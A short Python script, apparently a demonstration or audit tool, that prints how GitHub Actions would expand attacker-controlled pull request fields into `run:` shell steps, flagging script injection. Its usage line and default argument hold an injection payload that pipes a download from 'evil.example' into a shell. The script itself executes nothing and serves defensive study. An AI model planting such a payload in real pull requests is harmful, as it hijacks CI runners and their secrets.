#!/usr/bin/env python3
"""Shows what a GitHub Actions runner would EXECUTE for a hostile pull request.

usage: python3 attack/simulate.py .github/workflows/ci.yml 'x"; curl evil.example | sh; echo "'

GitHub replaces every ${{ ... }} expression with its value BEFORE the shell sees the script. This script does the same for the
two attacker-controlled values (the pull request title and the branch name) and prints each `run:` step as the shell would get it.
Nothing is executed.
"""
import re, sys

try:
    import yaml
except ImportError:
    sys.exit("PyYAML is missing:  python3 -m pip install pyyaml")

path = sys.argv[1] if len(sys.argv) > 1 else ".github/workflows/ci.yml"
title = sys.argv[2] if len(sys.argv) > 2 else 'x"; curl evil.example | sh; echo "'
doc = yaml.safe_load(open(path))
subs = {
    "github.event.pull_request.title": title,
    "github.head_ref": title,
    "github.event.pull_request.body": title,
    "github.event.issue.title": title,
    "github.event.comment.body": title,
}
expr = re.compile(r"\$\{\{\s*([^}]+?)\s*\}\}")
found = False
for jn, job in (doc.get("jobs") or {}).items():
    for st in job.get("steps", []):
        run = st.get("run")
        if not run:
            continue
        env_names = set((st.get("env") or {}).keys())
        script = expr.sub(lambda m: subs.get(m.group(1), m.group(0)), run)
        hostile = any(k in run for k in subs)
        if hostile:
            found = True
        print("--- job %s, step %r %s" % (jn, st.get("name", "(unnamed)"), "  <-- ATTACKER TEXT IS INSIDE THE SCRIPT" if hostile else ""))
        print(script.rstrip())
if not found:
    print("\nNo run: step contains an attacker-controlled expression. Good.")
